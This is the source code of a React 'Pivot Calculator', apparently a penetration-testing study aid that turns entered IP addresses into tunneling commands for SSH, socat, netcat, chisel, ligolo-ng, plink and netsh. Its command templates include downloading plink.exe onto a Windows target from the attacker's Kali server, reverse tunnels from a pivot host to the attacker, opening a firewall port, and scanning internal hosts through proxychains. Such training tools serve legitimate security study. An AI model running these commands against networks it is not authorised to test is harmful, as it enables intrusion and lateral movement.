import { useState, useCallback } from "react";

const methods = [
  { id: "ssh_local", label: "SSH Local (-L)" },
  { id: "ssh_dynamic", label: "SSH Dynamic SOCKS (-D)" },
  { id: "ssh_remote", label: "SSH Remote (-R)" },
  { id: "ssh_remote_dynamic", label: "SSH Remote Dynamic" },
  { id: "sshuttle", label: "sshuttle (VPN-like)" },
  { id: "socat", label: "Socat" },
  { id: "nc_fifo", label: "Netcat + FIFO" },
  { id: "plink", label: "Plink (Windows)" },
  { id: "netsh", label: "Netsh (Windows)" },
  { id: "ssh_exe", label: "ssh.exe (Windows)" },
  { id: "chisel_server", label: "Chisel" },
  { id: "ligolo", label: "Ligolo-ng" },
];

const protocols = [
  { id: "smb", label: "SMB", port: "445" },
  { id: "ssh", label: "SSH", port: "22" },
  { id: "rdp", label: "RDP", port: "3389" },
  { id: "http", label: "HTTP", port: "80" },
  { id: "https", label: "HTTPS", port: "443" },
  { id: "postgres", label: "PostgreSQL", port: "5432" },
  { id: "mysql", label: "MySQL", port: "3306" },
  { id: "winrm", label: "WinRM", port: "5985" },
  { id: "custom", label: "Custom", port: "" },
];

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  const handle = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={handle} className={`copy-btn ${copied ? "copied" : ""}`}>
      {copied ? "✓" : "⎘"}
    </button>
  );
}

function CommandBlock({ label, cmd, note }) {
  if (!cmd) return null;
  return (
    <div className="cmd-block">
      <div className="cmd-header">
        <span className="cmd-label">{label}</span>
        <CopyButton text={cmd} />
      </div>
      <pre className="cmd-text">{cmd}</pre>
      {note && <div className="cmd-note">{note}</div>}
    </div>
  );
}

function generateCommands(method, f) {
  const {
    kaliIp, pivotExtIp, pivotIntIp, pivotUser, pivotPass,
    targetIp, targetPort, listenPort, socksPort, thirdIp
  } = f;

  const p = {
    kali: kaliIp || "<kali_ip>",
    pivotExt: pivotExtIp || "<pivot_ext_ip>",
    pivotInt: pivotIntIp || "<pivot_int_ip>",
    pivotUser: pivotUser || "user",
    pivotPass: pivotPass || "<password>",
    target: targetIp || "<target_ip>",
    tPort: targetPort || "<target_port>",
    lPort: listenPort || "4455",
    sPort: socksPort || "9999",
    third: thirdIp || "<third_ip>",
  };

  switch (method) {
    case "ssh_local":
      return [
        {
          label: "▶ On pivot host — create tunnel",
          cmd: `ssh -N -L 0.0.0.0:${p.lPort}:${p.target}:${p.tPort} ${p.pivotUser}@${p.pivotInt}`,
          note: "No output after password = working. -N prevents shell from opening.",
        },
        {
          label: "▶ Verify tunnel is listening (pivot host)",
          cmd: `ss -ntlp | grep ${p.lPort}`,
        },
        {
          label: "▶ From Kali — connect through tunnel",
          cmd: `# Replace tool with: smbclient / psql / ssh / curl etc\nsmbclient -p ${p.lPort} //${p.pivotExt}/ -U ${p.pivotUser} --password=${p.pivotPass}\npsql -h ${p.pivotExt} -p ${p.lPort} -U postgres\nssh ${p.pivotUser}@${p.pivotExt} -p ${p.lPort}`,
          note: `Target is ${p.target}:${p.tPort} — accessed via ${p.pivotExt}:${p.lPort}`,
        },
      ];

    case "ssh_dynamic":
      return [
        {
          label: "▶ On pivot host — open SOCKS proxy",
          cmd: `ssh -N -D 0.0.0.0:${p.sPort} ${p.pivotUser}@${p.pivotInt}`,
          note: "Creates a SOCKS proxy on pivot. Route all tools through it via proxychains.",
        },
        {
          label: "▶ Configure proxychains on Kali",
          cmd: `# Edit /etc/proxychains4.conf — replace last line with:\nsocks5 ${p.pivotExt} ${p.sPort}\n\n# Speed up nmap (lower timeouts):\n# tcp_read_time_out 800\n# tcp_connect_time_out 700`,
        },
        {
          label: "▶ From Kali — use proxychains",
          cmd: `proxychains smbclient -L //${p.target}/ -U ${p.pivotUser} --password=${p.pivotPass}\nproxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains curl http://${p.target}:${p.tPort}`,
          note: "proxychains wraps any dynamically-linked binary. Won't work on static binaries.",
        },
      ];

    case "ssh_remote":
      return [
        {
          label: "▶ On pivot host — forward port to Kali",
          cmd: `ssh -N -R 127.0.0.1:${p.lPort}:${p.target}:${p.tPort} kali@${p.kali}`,
          note: "Use when Kali can't reach pivot but pivot can reach Kali.",
        },
        {
          label: "▶ From Kali — connect locally",
          cmd: `smbclient -p ${p.lPort} //127.0.0.1/ -U ${p.pivotUser}\npsql -h 127.0.0.1 -p ${p.lPort} -U postgres`,
          note: `Port ${p.lPort} on Kali localhost → ${p.target}:${p.tPort}`,
        },
      ];

    case "ssh_remote_dynamic":
      return [
        {
          label: "▶ On pivot host — reverse SOCKS to Kali",
          cmd: `ssh -N -R ${p.sPort} kali@${p.kali}`,
          note: "Creates SOCKS proxy on Kali localhost. Pivot reaches out to Kali.",
        },
        {
          label: "▶ Configure proxychains on Kali",
          cmd: `# /etc/proxychains4.conf:\nsocks5 127.0.0.1 ${p.sPort}`,
        },
        {
          label: "▶ From Kali — use proxychains",
          cmd: `proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains smbclient -L //${p.target}/ -U ${p.pivotUser}`,
        },
      ];

    case "socat":
      return [
        {
          label: "▶ On pivot host — start forwarder",
          cmd: `socat -ddd TCP-LISTEN:${p.lPort},fork TCP:${p.target}:${p.tPort}`,
          note: "Listens on pivot, forwards to target. Kill with: kill $(pgrep socat)",
        },
        {
          label: "▶ Verify listening (pivot host)",
          cmd: `ss -ntlp | grep ${p.lPort}`,
        },
        {
          label: "▶ From Kali — connect through socat",
          cmd: `smbclient -p ${p.lPort} //${p.pivotExt}/ -U ${p.pivotUser}\npsql -h ${p.pivotExt} -p ${p.lPort} -U postgres\nssh ${p.pivotUser}@${p.pivotExt} -p ${p.lPort}`,
          note: `${p.pivotExt}:${p.lPort} → ${p.target}:${p.tPort}`,
        },
        {
          label: "▶ Kill socat when done",
          cmd: `kill $(pgrep socat)`,
        },
      ];

    case "nc_fifo":
      return [
        {
          label: "▶ On pivot host — nc + fifo forward",
          cmd: `mkfifo /tmp/pivot_pipe\nnc -lnvp ${p.lPort} < /tmp/pivot_pipe | nc ${p.target} ${p.tPort} > /tmp/pivot_pipe`,
          note: "No socat needed. Single connection only — restart for each connection.",
        },
        {
          label: "▶ From Kali",
          cmd: `nc ${p.pivotExt} ${p.lPort}`,
        },
      ];

    case "chisel_server":
      return [
        {
          label: "▶ On Kali — start chisel server",
          cmd: `./chisel server -p 8080 --reverse --socks5`,
        },
        {
          label: "▶ On pivot host — connect client",
          cmd: `./chisel client ${p.kali}:8080 R:socks`,
          note: "Creates SOCKS proxy on Kali. Transfer chisel binary to pivot first.",
        },
        {
          label: "▶ Configure proxychains on Kali",
          cmd: `# /etc/proxychains4.conf:\nsocks5 127.0.0.1 1080`,
        },
        {
          label: "▶ From Kali — use proxychains",
          cmd: `proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains smbclient -L //${p.target}/ -U ${p.pivotUser}`,
        },
        {
          label: "▶ Single port forward (no SOCKS)",
          cmd: `# On pivot:\n./chisel client ${p.kali}:8080 R:${p.lPort}:${p.target}:${p.tPort}\n# Kali now has localhost:${p.lPort} → ${p.target}:${p.tPort}`,
        },
      ];

    case "ligolo":
      return [
        {
          label: "▶ On Kali — start ligolo proxy",
          cmd: `sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601`,
        },
        {
          label: "▶ On pivot host — connect agent",
          cmd: `./agent -connect ${p.kali}:11601 -ignore-cert`,
          note: "Transfer agent binary to pivot first.",
        },
        {
          label: "▶ In ligolo console — set up tunnel",
          cmd: `session\n# select the session\nstart\n# Add route on Kali:\nsudo ip route add ${p.target}/24 dev ligolo`,
        },
        {
          label: "▶ From Kali — direct access (no proxychains needed)",
          cmd: `nmap -sT -Pn ${p.target}\nsmbclient -L //${p.target}/ -U ${p.pivotUser}\npsql -h ${p.target} -p ${p.tPort} -U postgres`,
          note: "Ligolo routes traffic natively — no proxychains needed. Fastest option.",
        },
      ];

    case "sshuttle":
      return [
        {
          label: "▶ Setup — socat forward to reach SSH server (if needed)",
          cmd: `# On pivot host first (if no direct SSH access):
socat TCP-LISTEN:2222,fork TCP:${p.pivotInt}:22
# Skip if you can SSH directly to pivot`,
        },
        {
          label: "▶ On Kali — run sshuttle (sudo required)",
          cmd: `sshuttle -r ${p.pivotUser}@${p.pivotExt}:2222 ${p.target.split('.').slice(0,3).join('.')}.0/24
# Or multiple subnets:
sshuttle -r ${p.pivotUser}@${p.pivotExt}:2222 10.4.50.0/24 172.16.50.0/24`,
          note: "After this runs — connect directly to internal hosts, no proxychains needed.",
        },
        {
          label: "▶ From Kali — direct access (no proxychains)",
          cmd: `smbclient -L //${p.target}/ -U ${p.pivotUser} --password=${p.pivotPass}
psql -h ${p.target} -p ${p.tPort} -U postgres
nmap -sT -Pn ${p.target}`,
          note: "sshuttle routes transparently — use tools as if on same network.",
        },
        {
          label: "▶ Cleanup",
          cmd: `# Ctrl+C in the sshuttle terminal to stop
# Routes are removed automatically`,
        },
      ];

    case "plink":
      return [
        {
          label: "▶ On Kali — serve plink.exe",
          cmd: `sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
sudo systemctl start apache2
sudo systemctl start ssh`,
        },
        {
          label: "▶ On Windows target — download plink",
          cmd: `powershell wget -Uri http://${p.kali}/plink.exe -OutFile C:\\Windows\\Temp\\plink.exe`,
        },
        {
          label: "▶ On Windows — remote port forward via plink",
          cmd: `C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <kali_password> -R 127.0.0.1:${p.lPort}:${p.target}:${p.tPort} ${p.kali}`,
          note: "Password exposed on command line — create dedicated port-forward user on Kali if in hostile env.",
        },
        {
          label: "▶ Non-TTY shell — pipe y to accept host key",
          cmd: `cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:${p.lPort}:${p.target}:${p.tPort} ${p.kali}`,
          note: "NOTE: Plink does NOT support remote dynamic port forwarding (-D). Single port only.",
        },
        {
          label: "▶ From Kali — connect through tunnel",
          cmd: `psql -h 127.0.0.1 -p ${p.lPort} -U postgres
smbclient -p ${p.lPort} //127.0.0.1/ -U ${p.pivotUser}
ssh user@127.0.0.1 -p ${p.lPort}`,
        },
      ];

    case "netsh":
      return [
        {
          label: "▶ On Windows (admin required) — create port forward",
          cmd: `netsh interface portproxy add v4tov4 listenport=${p.lPort} listenaddress=${p.pivotExt} connectport=${p.tPort} connectaddress=${p.target}`,
        },
        {
          label: "▶ Verify port forward created",
          cmd: `netsh interface portproxy show all
netstat -anp TCP | find "${p.lPort}"`,
        },
        {
          label: "▶ Open firewall hole (port will show as filtered without this)",
          cmd: `netsh advfirewall firewall add rule name="pf_${p.lPort}" protocol=TCP dir=in localip=${p.pivotExt} localport=${p.lPort} action=allow`,
          note: "Without this firewall rule nmap will show port as filtered.",
        },
        {
          label: "▶ From Kali — connect through forward",
          cmd: `ssh ${p.pivotUser}@${p.pivotExt} -p ${p.lPort}
psql -h ${p.pivotExt} -p ${p.lPort} -U postgres
smbclient -p ${p.lPort} //${p.pivotExt}/ -U ${p.pivotUser}`,
          note: `${p.pivotExt}:${p.lPort} → ${p.target}:${p.tPort}`,
        },
        {
          label: "▶ CLEANUP — always delete rules when done",
          cmd: `netsh advfirewall firewall delete rule name="pf_${p.lPort}"
netsh interface portproxy del v4tov4 listenport=${p.lPort} listenaddress=${p.pivotExt}`,
        },
      ];

    case "ssh_exe":
      return [
        {
          label: "▶ Verify ssh.exe available and version",
          cmd: `where ssh
ssh.exe -V
# Needs >= 7.6 for remote dynamic port forwarding`,
        },
        {
          label: "▶ On Kali — start SSH server",
          cmd: `sudo systemctl start ssh
sudo ss -ntplu | grep 22`,
          note: "Enable password auth if needed: set PasswordAuthentication yes in /etc/ssh/sshd_config",
        },
        {
          label: "▶ On Windows — remote dynamic (SOCKS proxy on Kali)",
          cmd: `ssh -N -R ${p.sPort} kali@${p.kali}`,
          note: "Creates SOCKS proxy on Kali localhost. Same as Linux -R dynamic.",
        },
        {
          label: "▶ Configure proxychains on Kali",
          cmd: `# /etc/proxychains4.conf:
socks5 127.0.0.1 ${p.sPort}`,
        },
        {
          label: "▶ From Kali — use proxychains",
          cmd: `proxychains psql -h ${p.target} -U postgres
proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}
proxychains smbclient -L //${p.target}/ -U ${p.pivotUser}`,
        },
        {
          label: "▶ Verify SOCKS port opened on Kali",
          cmd: `ss -ntplu | grep ${p.sPort}`,
        },
      ];

    default:
      return [];
  }
}

export default function PivotCalc() {
  const [method, setMethod] = useState("ssh_local");
  const [proto, setProto] = useState("smb");
  const [fields, setFields] = useState({
    kaliIp: "",
    pivotExtIp: "",
    pivotIntIp: "",
    pivotUser: "database_admin",
    pivotPass: "",
    targetIp: "",
    targetPort: "445",
    listenPort: "4455",
    socksPort: "9999",
    thirdIp: "",
  });

  const set = (k) => (e) => setFields((f) => ({ ...f, [k]: e.target.value }));

  const handleProto = (id, port) => {
    setProto(id);
    if (port) setFields((f) => ({ ...f, targetPort: port }));
  };

  const commands = generateCommands(method, fields);

  const diagramStops = [
    { label: "Kali", ip: fields.kaliIp || "?.?.?.?", color: "#4ade80" },
    { label: "Pivot", ip: fields.pivotExtIp || "?.?.?.?", color: "#facc15" },
    { label: "Target", ip: fields.targetIp || "?.?.?.?", color: "#f87171" },
  ];

  return (
    <div className="pc-root">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        .pc-root {
          min-height: 100vh;
          background: #080b12;
          color: #c8d6e5;
          font-family: 'JetBrains Mono', monospace;
          padding: 2rem 1rem;
        }

        .pc-header {
          max-width: 900px;
          margin: 0 auto 2rem;
          border-bottom: 1px solid #1e2d40;
          padding-bottom: 1.5rem;
        }

        .pc-title {
          font-family: 'Syne', sans-serif;
          font-size: 2rem;
          font-weight: 800;
          color: #4ade80;
          letter-spacing: -0.02em;
        }

        .pc-subtitle {
          font-size: 0.75rem;
          color: #4a5568;
          margin-top: 0.25rem;
          text-transform: uppercase;
          letter-spacing: 0.1em;
        }

        .pc-back {
          display: inline-block;
          margin-bottom: 1rem;
          color: #4a5568;
          font-size: 0.75rem;
          text-decoration: none;
          letter-spacing: 0.05em;
        }
        .pc-back:hover { color: #4ade80; }

        .pc-body {
          max-width: 900px;
          margin: 0 auto;
          display: grid;
          gap: 1.5rem;
        }

        /* DIAGRAM */
        .diagram {
          background: #0d1520;
          border: 1px solid #1e2d40;
          border-radius: 8px;
          padding: 1.25rem;
          display: flex;
          align-items: center;
          gap: 0;
          overflow-x: auto;
        }

        .diag-node {
          display: flex;
          flex-direction: column;
          align-items: center;
          min-width: 120px;
        }

        .diag-box {
          border: 1px solid;
          border-radius: 6px;
          padding: 0.5rem 1rem;
          font-size: 0.7rem;
          text-align: center;
          width: 100%;
        }

        .diag-label {
          font-weight: 700;
          font-size: 0.65rem;
          text-transform: uppercase;
          letter-spacing: 0.1em;
          margin-bottom: 0.2rem;
        }

        .diag-ip {
          font-size: 0.65rem;
          opacity: 0.7;
        }

        .diag-arrow {
          flex: 1;
          display: flex;
          align-items: center;
          justify-content: center;
          min-width: 60px;
          color: #2d4a6b;
          font-size: 0.65rem;
          text-align: center;
          flex-direction: column;
          gap: 2px;
        }

        .diag-line {
          height: 2px;
          width: 100%;
          background: linear-gradient(90deg, #1e3a5f, #2d5a8e, #1e3a5f);
        }

        .diag-port {
          font-size: 0.6rem;
          color: #4a90d9;
        }

        /* SECTIONS */
        .section {
          background: #0d1520;
          border: 1px solid #1e2d40;
          border-radius: 8px;
          padding: 1.25rem;
        }

        .section-title {
          font-size: 0.65rem;
          text-transform: uppercase;
          letter-spacing: 0.12em;
          color: #4a5568;
          margin-bottom: 1rem;
          padding-bottom: 0.5rem;
          border-bottom: 1px solid #1a2535;
        }

        /* METHOD SELECTOR */
        .method-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
          gap: 0.5rem;
        }

        .method-btn {
          background: #0a1018;
          border: 1px solid #1e2d40;
          border-radius: 6px;
          padding: 0.6rem 0.75rem;
          color: #4a5568;
          font-family: 'JetBrains Mono', monospace;
          font-size: 0.7rem;
          cursor: pointer;
          text-align: left;
          transition: all 0.15s;
        }
        .method-btn:hover { border-color: #2d4a6b; color: #7a9bbf; }
        .method-btn.active {
          border-color: #4ade80;
          color: #4ade80;
          background: #0d1f10;
        }

        /* PROTOCOL SELECTOR */
        .proto-grid {
          display: flex;
          flex-wrap: wrap;
          gap: 0.4rem;
        }

        .proto-btn {
          background: #0a1018;
          border: 1px solid #1e2d40;
          border-radius: 4px;
          padding: 0.3rem 0.6rem;
          color: #4a5568;
          font-family: 'JetBrains Mono', monospace;
          font-size: 0.65rem;
          cursor: pointer;
          transition: all 0.15s;
        }
        .proto-btn:hover { border-color: #2d4a6b; color: #7a9bbf; }
        .proto-btn.active {
          border-color: #facc15;
          color: #facc15;
          background: #1a1500;
        }

        /* INPUT GRID */
        .input-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
          gap: 0.75rem;
        }

        .field {
          display: flex;
          flex-direction: column;
          gap: 0.3rem;
        }

        .field label {
          font-size: 0.6rem;
          text-transform: uppercase;
          letter-spacing: 0.1em;
          color: #4a5568;
        }

        .field input {
          background: #0a1018;
          border: 1px solid #1e2d40;
          border-radius: 4px;
          padding: 0.5rem 0.6rem;
          color: #c8d6e5;
          font-family: 'JetBrains Mono', monospace;
          font-size: 0.75rem;
          outline: none;
          transition: border-color 0.15s;
          width: 100%;
        }
        .field input:focus { border-color: #4ade80; }
        .field input::placeholder { color: #2d4a6b; }

        .field-group {
          display: flex;
          flex-direction: column;
          gap: 0.75rem;
        }

        .field-row {
          display: flex;
          gap: 0.75rem;
        }
        .field-row .field { flex: 1; }

        /* COMMANDS */
        .commands-area {
          display: flex;
          flex-direction: column;
          gap: 0.75rem;
        }

        .cmd-block {
          background: #060a10;
          border: 1px solid #1a2535;
          border-radius: 6px;
          overflow: hidden;
        }

        .cmd-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 0.4rem 0.75rem;
          background: #0a1520;
          border-bottom: 1px solid #1a2535;
        }

        .cmd-label {
          font-size: 0.65rem;
          color: #4a90d9;
          letter-spacing: 0.05em;
        }

        .copy-btn {
          background: none;
          border: 1px solid #1e2d40;
          border-radius: 3px;
          color: #4a5568;
          font-size: 0.7rem;
          padding: 0.15rem 0.4rem;
          cursor: pointer;
          transition: all 0.15s;
          font-family: inherit;
        }
        .copy-btn:hover { border-color: #4ade80; color: #4ade80; }
        .copy-btn.copied { border-color: #4ade80; color: #4ade80; }

        .cmd-text {
          padding: 0.75rem;
          font-size: 0.72rem;
          line-height: 1.6;
          color: #a0c4e8;
          white-space: pre-wrap;
          word-break: break-all;
        }

        .cmd-note {
          padding: 0.4rem 0.75rem;
          font-size: 0.62rem;
          color: #4a5568;
          border-top: 1px solid #1a2535;
          font-style: italic;
        }

        .empty-state {
          text-align: center;
          padding: 2rem;
          color: #2d4a6b;
          font-size: 0.75rem;
        }
      `}</style>

      <div className="pc-header">
        <a href="/" className="pc-back">← The Path</a>
        <div className="pc-title">Pivot Calculator</div>
        <div className="pc-subtitle">Fill in your IPs → get exact commands</div>
      </div>

      <div className="pc-body">

        {/* DIAGRAM */}
        <div className="diagram">
          {diagramStops.map((node, i) => (
            <>
              <div className="diag-node" key={node.label}>
                <div className="diag-box" style={{ borderColor: node.color, color: node.color }}>
                  <div className="diag-label">{node.label}</div>
                  <div className="diag-ip">{node.ip}</div>
                </div>
              </div>
              {i < diagramStops.length - 1 && (
                <div className="diag-arrow" key={`arrow-${i}`}>
                  <div className="diag-line" />
                  <div className="diag-port">
                    {i === 0 ? `:${fields.listenPort || fields.socksPort || "..."}` : `:${fields.targetPort || "..."}` }
                  </div>
                </div>
              )}
            </>
          ))}
        </div>

        {/* METHOD */}
        <div className="section">
          <div className="section-title">01 — Method</div>
          <div className="method-grid">
            {methods.map((m) => (
              <button
                key={m.id}
                className={`method-btn ${method === m.id ? "active" : ""}`}
                onClick={() => setMethod(m.id)}
              >
                {m.label}
              </button>
            ))}
          </div>
        </div>

        {/* PROTOCOL */}
        <div className="section">
          <div className="section-title">02 — Target Protocol</div>
          <div className="proto-grid">
            {protocols.map((p) => (
              <button
                key={p.id}
                className={`proto-btn ${proto === p.id ? "active" : ""}`}
                onClick={() => handleProto(p.id, p.port)}
              >
                {p.label} {p.port && `(${p.port})`}
              </button>
            ))}
          </div>
        </div>

        {/* INPUTS */}
        <div className="section">
          <div className="section-title">03 — Your Network</div>
          <div className="field-group">
            <div className="input-grid">
              <div className="field">
                <label>Kali IP (tun0)</label>
                <input value={fields.kaliIp} onChange={set("kaliIp")} placeholder="192.168.45.210" />
              </div>
              <div className="field">
                <label>Pivot External IP</label>
                <input value={fields.pivotExtIp} onChange={set("pivotExtIp")} placeholder="192.168.50.63" />
              </div>
              <div className="field">
                <label>Pivot Internal IP</label>
                <input value={fields.pivotIntIp} onChange={set("pivotIntIp")} placeholder="10.4.50.63" />
              </div>
              <div className="field">
                <label>Pivot SSH User</label>
                <input value={fields.pivotUser} onChange={set("pivotUser")} placeholder="database_admin" />
              </div>
            </div>
            <div className="input-grid">
              <div className="field">
                <label>Target (Internal) IP</label>
                <input value={fields.targetIp} onChange={set("targetIp")} placeholder="172.16.50.217" />
              </div>
              <div className="field">
                <label>Target Port</label>
                <input value={fields.targetPort} onChange={set("targetPort")} placeholder="445" />
              </div>
              <div className="field">
                <label>Local Listen Port</label>
                <input value={fields.listenPort} onChange={set("listenPort")} placeholder="4455" />
              </div>
              <div className="field">
                <label>SOCKS Port</label>
                <input value={fields.socksPort} onChange={set("socksPort")} placeholder="9999" />
              </div>
            </div>
          </div>
        </div>

        {/* COMMANDS */}
        <div className="section">
          <div className="section-title">04 — Generated Commands</div>
          {commands.length === 0 ? (
            <div className="empty-state">Select a method above to generate commands</div>
          ) : (
            <div className="commands-area">
              {commands.map((c, i) => (
                <CommandBlock key={i} label={c.label} cmd={c.cmd} note={c.note} />
              ))}
            </div>
          )}
        </div>

      </div>
    </div>
  );
}
